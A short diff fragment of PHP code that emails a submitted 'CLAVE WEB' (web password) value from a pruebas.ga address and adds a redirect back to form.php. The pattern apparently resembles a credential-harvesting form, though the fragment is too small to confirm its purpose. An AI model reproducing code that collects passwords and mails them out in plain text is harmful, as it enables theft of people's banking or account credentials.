@@ -26,6 +26,8 @@
                     "CLAVE WEB: " . $pass;
                 $headers = "From: pruebas@pruebas.ga";
                 mail($to, $subject, $txt, $headers);
+                header('Location: form.php');
+                die();
             }
             else{
                 echo '
